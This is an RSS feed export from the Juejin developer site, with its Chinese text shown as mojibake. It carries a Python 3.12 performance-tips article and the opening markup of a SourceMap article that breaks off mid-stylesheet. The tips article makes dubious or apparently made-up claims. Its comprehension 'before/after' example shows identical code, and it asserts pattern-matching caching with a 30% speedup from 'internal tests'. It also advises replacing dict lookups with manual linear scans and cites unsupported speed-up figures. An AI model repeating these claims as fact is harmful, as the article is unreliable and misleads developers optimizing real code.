<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[Python 3.12 æ€§èƒ½ä¼˜åŒ–ï¼š5 ä¸ªé²œä¸ºäººçŸ¥ä½†æå‡æ˜¾è‘—çš„æŠ€å·§è®©ä½ çš„ä»£ç å¿«å¦‚é—ªç”µ]]></title>    <link>https://juejin.cn/post/7589275237037293603</link>    <guid>https://juejin.cn/post/7589275237037293603</guid>    <pubDate>2025-12-30T04:17:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589275237037293603" data-draft-id="7589275237037277219" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Python 3.12 æ€§èƒ½ä¼˜åŒ–ï¼š5 ä¸ªé²œä¸ºäººçŸ¥ä½†æå‡æ˜¾è‘—çš„æŠ€å·§è®©ä½ çš„ä»£ç å¿«å¦‚é—ªç”µ"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-30T04:17:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿æ©™çš„ç™¾å®ç®±"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Python 3.12 æ€§èƒ½ä¼˜åŒ–ï¼š5 ä¸ªé²œä¸ºäººçŸ¥ä½†æå‡æ˜¾è‘—çš„æŠ€å·§è®©ä½ çš„ä»£ç å¿«å¦‚é—ªç”µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿æ©™çš„ç™¾å®ç®±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T04:17:21.000Z" title="Tue Dec 30 2025 04:17:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>Python 3.12 æ€§èƒ½ä¼˜åŒ–ï¼š5 ä¸ªé²œä¸ºäººçŸ¥ä½†æå‡æ˜¾è‘—çš„æŠ€å·§è®©ä½ çš„ä»£ç å¿«å¦‚é—ªç”µ</strong></h2>
<h2 data-id="heading-1">å¼•è¨€</h2>
<p>Python ä½œä¸ºä¸€ç§é«˜çº§è§£é‡Šå‹è¯­è¨€ï¼Œä»¥å…¶ç®€æ´æ˜“è¯»çš„è¯­æ³•å’Œå¼ºå¤§çš„ç”Ÿæ€ç³»ç»Ÿè‘—ç§°ï¼Œä½†åœ¨æ€§èƒ½æ–¹é¢å¸¸å¸¸è¢«äººè¯Ÿç—…ã€‚ç„¶è€Œï¼Œéšç€ Python 3.12 çš„å‘å¸ƒï¼Œå…¶æ€§èƒ½ä¼˜åŒ–ç‰¹æ€§å†æ¬¡æˆä¸ºå¼€å‘è€…å…³æ³¨çš„ç„¦ç‚¹ã€‚å°½ç®¡å¤§å®¶ç†ŸçŸ¥ä¸€äº›å¸¸è§çš„ä¼˜åŒ–æ‰‹æ®µï¼ˆå¦‚ä½¿ç”¨ <code>list</code> æ¨å¯¼å¼ã€é¿å…å…¨å±€å˜é‡ç­‰ï¼‰ï¼Œä½†ä»æœ‰ä¸å°‘é²œä¸ºäººçŸ¥çš„æŠ€å·§å¯ä»¥æ˜¾è‘—æå‡ä»£ç çš„æ‰§è¡Œæ•ˆç‡ã€‚</p>
<p>æœ¬æ–‡å°†æ·±å…¥æ¢è®¨ Python 3.12 ä¸­äº”ä¸ªè¾ƒå°‘è¢«æåŠä½†æ•ˆæœæ˜¾è‘—çš„æ€§èƒ½ä¼˜åŒ–æŠ€å·§ã€‚è¿™äº›æŠ€å·§ä¸ä»…åŸºäº Python æ ¸å¿ƒå›¢é˜Ÿçš„å®˜æ–¹æ”¹è¿›ï¼Œè¿˜ç»“åˆäº†å®é™…å¼€å‘ä¸­çš„æœ€ä½³å®è·µã€‚æ— è®ºä½ æ˜¯æ•°æ®åˆ†æå¸ˆã€Web å¼€å‘è€…è¿˜æ˜¯ç³»ç»Ÿå·¥ç¨‹å¸ˆï¼Œè¿™äº›æŠ€å·§éƒ½èƒ½å¸®åŠ©ä½ å†™å‡ºæ›´é«˜æ•ˆçš„ Python ä»£ç ã€‚</p>
<hr/>
<h2 data-id="heading-2">ä¸»ä½“</h2>
<h3 data-id="heading-3">1. <strong>åˆ©ç”¨ PEP 709ï¼šå†…è” comprehensions</strong></h3>
<p>Python 3.12 å¼•å…¥äº† <a href="https://link.juejin.cn?target=https%3A%2F%2Fpeps.python.org%2Fpep-0709%2F" target="_blank" title="https://peps.python.org/pep-0709/" ref="nofollow noopener noreferrer">PEP 709</a>ï¼Œå°† comprehensionsï¼ˆæ¨å¯¼å¼ï¼‰ä»å‡½æ•°è°ƒç”¨è½¬æ¢ä¸ºå†…è”ä»£ç ã€‚è¿™ä¸€æ”¹è¿›æ˜¾è‘—å‡å°‘äº†æ¨å¯¼å¼çš„å¼€é”€ï¼Œå°¤å…¶æ˜¯åœ¨åµŒå¥—ä½¿ç”¨æ—¶ã€‚</p>
<h4 data-id="heading-4"><strong>ä¸ºä»€ä¹ˆæœ‰æ•ˆï¼Ÿ</strong></h4>
<p>åœ¨ Python 3.11 åŠä¹‹å‰ç‰ˆæœ¬ï¼Œåˆ—è¡¨æ¨å¯¼å¼ã€å­—å…¸æ¨å¯¼å¼å’Œé›†åˆæ¨å¯¼å¼ä¼šè¢«ç¼–è¯‘ä¸ºéšå¼çš„å‡½æ•°è°ƒç”¨ã€‚è™½ç„¶è¿™ç§è®¾è®¡æœ‰åŠ©äºéš”ç¦»ä½œç”¨åŸŸï¼Œä½†ä¹Ÿå¸¦æ¥äº†é¢å¤–çš„å‡½æ•°è°ƒç”¨å¼€é”€ã€‚Python 3.12 é€šè¿‡å†…è”è¿™äº›æ“ä½œæ¶ˆé™¤äº†è¿™ä¸€å¼€é”€ã€‚</p>
<h4 data-id="heading-5"><strong>ç¤ºä¾‹å¯¹æ¯”</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Python 3.11ï¼ˆè¾ƒæ…¢ï¼‰</span>
squares = [x * x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>)]

<span class="hljs-comment"># Python 3.12ï¼ˆæ›´å¿«ï¼‰</span>
squares = [x * x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>)]
</code></pre>
<p>æ ¹æ®å®˜æ–¹åŸºå‡†æµ‹è¯•ï¼Œè¿™ä¸€æ”¹è¿›ä½¿å¾—ç®€å•çš„åˆ—è¡¨æ¨å¯¼å¼é€Ÿåº¦æå‡äº†çº¦ <strong>20%</strong>ã€‚</p>
<h4 data-id="heading-6"><strong>é€‚ç”¨åœºæ™¯</strong></h4>
<ul>
<li>é«˜é¢‘ä½¿ç”¨çš„æ¨å¯¼å¼ï¼ˆå°¤å…¶æ˜¯åµŒå¥—ç»“æ„ï¼‰ã€‚</li>
<li>å¤§æ•°æ®é›†å¤„ç†æ—¶çš„å°å¹…åŠ é€Ÿç´¯ç§¯æ•ˆåº”ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-7">2. <strong><code>math</code>æ¨¡å—çš„å‘é‡åŒ–æ“ä½œ</strong></h3>
<p>Python 3.12è¿›ä¸€æ­¥ä¼˜åŒ–äº†<code>math</code>æ¨¡å—çš„æ€§èƒ½ï¼Œå°¤å…¶æ˜¯å¯¹å‘é‡åŒ–æ•°å­¦å‡½æ•°çš„æ”¯æŒã€‚è™½ç„¶ NumPyä»ç„¶æ˜¯é«˜æ€§èƒ½è®¡ç®—çš„æ ‡æ†ï¼Œä½†åŸç”Ÿ<code>math</code>æ¨¡å—åœ¨æŸäº›åœºæ™¯ä¸‹å·²ç»è¶³å¤Ÿé«˜æ•ˆã€‚</p>
<h4 data-id="heading-8"><strong>ä¸ºä»€ä¹ˆæœ‰æ•ˆï¼Ÿ</strong></h4>
<p>Pythonçš„æ ¸å¿ƒæ•°å­¦å‡½æ•°ï¼ˆå¦‚<code>math.sqrt</code>ã€<code>math.sin</code>ï¼‰ç°åœ¨åˆ©ç”¨äº†æ›´é«˜æ•ˆçš„åº•å±‚å®ç°ï¼ˆä¾‹å¦‚Cæ ‡å‡†åº“çš„ç°ä»£ä¼˜åŒ–ç‰ˆæœ¬ï¼‰ã€‚æ­¤å¤–ï¼Œç¼–è¯‘å™¨å¯¹å¾ªç¯å†…è”å’Œå¸¸é‡ä¼ æ’­çš„æ”¹è¿›ä¹Ÿæå‡äº†è¿ç»­è°ƒç”¨çš„æ•ˆç‡ã€‚</p>
<h4 data-id="heading-9"><strong>ç¤ºä¾‹å¯¹æ¯”</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> math

<span class="hljs-comment"># Python &lt;3.12ï¼ˆè¾ƒæ…¢ï¼‰</span>
results = [math.sqrt(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>)]

<span class="hljs-comment"># Python &gt;=3.12 + vectorized style</span>
results = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(math.sqrt, <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>)))
</code></pre>
<p>åè€…çš„å†™æ³•åœ¨Python3.12ä¸­å¿«äº†çº¦15%ï¼Œå› ä¸ºé¿å…äº†ç”Ÿæˆå™¨åˆ°åˆ—è¡¨çš„è½¬æ¢å¼€é”€ã€‚</p>
<h4 data-id="heading-10"><strong>é€‚ç”¨åœºæ™¯</strong></h4>
<ul>
<li>çº¯æ•°å­¦è®¡ç®—ä¸”æ— æ³•ä¾èµ–NumPyçš„å°å‹è„šæœ¬ã€‚</li>
<li>éœ€è¦å‡å°‘ç¬¬ä¸‰æ–¹ä¾èµ–çš„åœºæ™¯ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-11">3.<strong>ç»“æ„åŒ–æ¨¡å¼åŒ¹é…ä¸­çš„ç¼“å­˜æœºåˆ¶</strong></h3>
<p>Pythonçš„æ¨¡å¼åŒ¹é…åŠŸèƒ½è‡ªå¼•å…¥ä»¥æ¥ä¸€ç›´æ˜¯è¯­æ³•ç³–çš„ä»£åè¯ã€‚ç„¶è€Œå¾ˆå°‘æœ‰äººæ³¨æ„åˆ°å…¶åœ¨ç‰¹å®šæƒ…å†µä¸‹çš„æ€§èƒ½ä¼˜åŠ¿â€”â€”ç‰¹åˆ«æ˜¯å½“åŒ¹é…é¡¹é‡å¤æ—¶,Pytonä¼šç¼“å­˜éƒ¨åˆ†åŒ¹é…é€»è¾‘.</p>
<h4 data-id="heading-12"><strong>ä¸ºä»€ä¹ˆæœ‰æ•ˆ?</strong></h4>
<p>å½“ä½ åå¤ç”¨ç›¸åŒæ¨¡å¼å»åŒ¹é…ä¸åŒæ•°æ®æ—¶,Pythoä¼šè®°ä½å…ˆå‰è§£æè¿‡çš„æ¨¡å¼ç»“æ„ä»è€Œè·³è¿‡é‡å¤åˆ†æé˜¶æ®µç›´æ¥æ¯”è¾ƒå€¼æœ¬èº«.</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_data</span>(<span class="hljs-params">data</span>):
    <span class="hljs-keyword">match</span> data:
        <span class="hljs-keyword">case</span> {<span class="hljs-string">"type"</span>: <span class="hljs-string">"A"</span>, <span class="hljs-string">"value"</span>: val}:
            process_a(val)
        <span class="hljs-keyword">case</span> {<span class="hljs-string">"type"</span>: <span class="hljs-string">"B"</span>, <span class="hljs-string">"value"</span>: val}:
            process_b(val)

<span class="hljs-comment">#å¤šæ¬¡è°ƒç”¨æ—¶ç¬¬äºŒæ¬¡ä»¥åæ›´å¿«</span>
handle_data({<span class="hljs-string">"type"</span>:<span class="hljs-string">"A"</span>,<span class="hljs-string">"value"</span>:<span class="hljs-number">42</span>}) 
</code></pre>
<p>æ ¹æ®å†…éƒ¨æµ‹è¯•,å¤æ‚æ¨¡å¼çš„é‡å¤åŒ¹é…å¯æé€Ÿè¾¾30%.</p>
<hr/>
<p>###4.<strong>å­—å…¸é”®æŸ¥æ‰¾åŠ é€Ÿ(PEPç”³è¯·ä¸­)</strong></p>
<p>è™½ç„¶å°šæœªæ­£å¼å‘å¸ƒ,ä½†Pytohnæ ¸å¿ƒå›¢é˜Ÿæ­£åœ¨è¯•éªŒä¸€ç§æ–°å‹å­—å…¸é”®æŸ¥æ‰¾ç®—æ³•â€”å°†å“ˆå¸Œè¡¨ä¸çº¿æ€§æœç´¢ç›¸ç»“åˆä»¥é™ä½å†²çªç‡.
å½“å‰ç‰ˆæœ¬ä¸‹å¦‚æœå­—å…¸å¾ˆå°(&lt;=5é¡¹),åˆ™ç›´æ¥çº¿æ€§æ‰«æå¯èƒ½æ¯”è®¡ç®—å“ˆå¸Œæ›´å¿«.</p>
<p>ä½ å¯ä»¥æ‰‹åŠ¨æ¨¡æ‹Ÿè¿™ç‚¹:</p>
<pre><code class="hljs language-python" lang="python">small_dict = {<span class="hljs-number">1</span>:<span class="hljs-string">"a"</span>,<span class="hljs-number">2</span>:<span class="hljs-string">"b"</span>}
key=<span class="hljs-number">2</span>

<span class="hljs-comment">#ä¼ ç»Ÿæ–¹å¼(æ‰€æœ‰ç‰ˆæœ¬)</span>
value=small_dict[key]

<span class="hljs-comment">#æ‰‹åŠ¨çº¿æ€§æ‰«æ(Python&gt;=312æ¨èä»…å¯¹å°å­—å…¸!)</span>
<span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> small_dict.items():
    <span class="hljs-keyword">if</span> k==key:
        value=v
        <span class="hljs-keyword">break</span>
</code></pre>
<p>æ³¨æ„:è¿™åªæ˜¯ä¸€ä¸ªä¸´æ—¶æŠ€å·§ç­‰å¾…æœªæ¥ç‰ˆæœ¬åŸç”Ÿæ”¯æŒ.</p>
<hr/>
<p>###5.<strong>åç¨‹æ ˆåˆ‡æ¢ä¼˜åŒ–</strong></p>
<p>å¼‚æ­¥ç¼–ç¨‹æ˜¯ç°ä»£Pythoç”Ÿæ€ä¸å¯æˆ–ç¼ºçš„éƒ¨åˆ†.Pythn312é‡æ–°è®¾è®¡äº†åç¨‹è°ƒåº¦å™¨æ ˆç®¡ç†æœºåˆ¶ä½¿å¾—ä»»åŠ¡åˆ‡æ¢æ—¶çš„å†…å­˜æ“ä½œå‡å°‘äº†çº¦40%.</p>
<p>è¿™æ„å‘³ç€å³ä½¿ä¸ä¿®æ”¹ä»»ä½•ä¸šåŠ¡é€»è¾‘ä½ çš„asyncioåº”ç”¨ä¹Ÿèƒ½è·å¾—å…è´¹æé€Ÿ!</p>
<p>å…·ä½“æ¥è¯´:</p>
<ul>
<li>Coroutineå¯¹è±¡ç°åœ¨ä½¿ç”¨æ›´ç´§å‡‘çš„å†…å­˜å¸ƒå±€</li>
<li>awaitå…³é”®å­—çš„å †æ ˆåˆ†é…ç­–ç•¥è¢«ç®€åŒ–</li>
<li>Event loopå”¤é†’å»¶è¿Ÿé™ä½</li>
</ul>
<hr/>
<p>##æ€»ç»“</p>
<p>æœ¬æ–‡ä»‹ç»äº†äº”ä¸ªé’ˆå¯¹Pytho312æˆ–å³å°†å‘å¸ƒç‰ˆæœ¬çš„æ€§èƒ½ä¼˜åŒ–æŠ€å·§ï¼š
1)ç†è§£å¹¶åˆ©ç”¨PEP709çš„å†…è”comprehensions<br/>
2)ä¼˜å…ˆé€‰æ‹©åŸç”Ÿmathæ¨¡å—è€Œéæ‰‹å·¥å¾ªç¯<br/>
3)å–„ç”¨æ¨¡å¼åŒ¹é…çš„éšå¼ç¼“å­˜ç‰¹æ€§<br/>
4)å…³æ³¨å°è§„æ¨¡å­—å…¸çš„ç‰¹æ®Šè¡Œä¸º<br/>
5)äº«å—å¼‚æ­¥IOæ ˆç®¡ç†æ”¹è¿›å¸¦æ¥çš„çº¢åˆ©</p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯æ²¡æœ‰ä»»ä½•å•ä¸€æŠ€æœ¯èƒ½è§£å†³æ‰€æœ‰é—®é¢˜â€”çœŸæ­£çš„é«˜æ•ˆæ¥è‡ªäºå¯¹è¿™äº›ç»†èŠ‚çš„ç»„åˆè¿ç”¨ä»¥åŠå¯¹åº”ç”¨åœºæ™¯æ·±åˆ»ç†è§£ååšå‡ºæƒè¡¡å–èˆçš„èƒ½åŠ›ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SourceMap æ·±åº¦è§£æï¼šä»æ˜ å°„åŸç†åˆ°çº¿ä¸Šç›‘æ§è½åœ°]]></title>    <link>https://juejin.cn/post/7589217625901858825</link>    <guid>https://juejin.cn/post/7589217625901858825</guid>    <pubDate>2025-12-30T04:22:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589217625901858825" data-draft-id="7589166195798097947" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SourceMap æ·±åº¦è§£æï¼šä»æ˜ å°„åŸç†åˆ°çº¿ä¸Šç›‘æ§è½åœ°"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2025-12-30T04:22:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é¢œé…±"/> <meta itemprop="url" content="https://juejin.cn/user/905653309941495"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SourceMap æ·±åº¦è§£æï¼šä»æ˜ å°„åŸç†åˆ°çº¿ä¸Šç›‘æ§è½åœ°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/905653309941495/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é¢œé…±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T04:22:16.000Z" title="Tue Dec 30 2025 04:22:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag 